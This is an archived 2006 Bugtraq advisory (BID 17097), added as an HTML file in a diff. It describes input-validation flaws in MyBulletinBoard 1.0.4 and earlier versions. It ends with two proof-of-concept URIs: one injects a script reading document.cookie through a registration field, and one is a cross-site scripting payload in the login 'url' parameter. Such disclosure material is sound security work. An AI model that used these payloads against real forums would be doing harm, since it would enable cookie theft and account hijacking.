@@ -1,0 +1,122 @@
+#SpeeDr00t@Black Falcon<br>#bid17097<p><b><span style="font-size: 18pt;">MyBB Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/17097/info">info</a><br><a href="http://www.securityfocus.com/bid/17097/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/17097/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/17097/solution">solution</a><br><a href="http://www.securityfocus.com/bid/17097/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				17097
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 14 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 16 2006 06:10AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				imei is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					MyBulletinBoard MyBulletinBoard 1.0.4 <br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard 1.0.3 <br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard 1.0.2 <br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard 1.0.1 <br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard 1.0  PR2<br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard 1.0 <br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard  RC4<br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard  RC3<br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard  RC2<br/>
+					
+				
+					MyBulletinBoard MyBulletinBoard  RC1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This issue can be exploited via a web client.<br/><br/>The following proof-of-concept URIs are available:<br/>HTML injection:<br/>http://www.example.com/mybb/member.php?username=blab&amp;password=blabblab &amp;password2=blabblab &amp;email=blab@blab.com&amp;&amp;email2=blab@blab.com&amp;imagestring=fill here if needed&amp;imagehash=fill here if needed&amp;action=do_register&amp;yahoo=%3C script%3E alert(document.cookie)%3C/script %3E&amp;regsubmit=register me mybb:D<br/><br/>Cross-site scripting:<br/>http://www.example.com/mybb/member.php?action=do_login&amp;username=imei&amp;password=doyouneedmine&amp;url=â?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!â??
+	
+		<ul>
+</ul>
+</div>
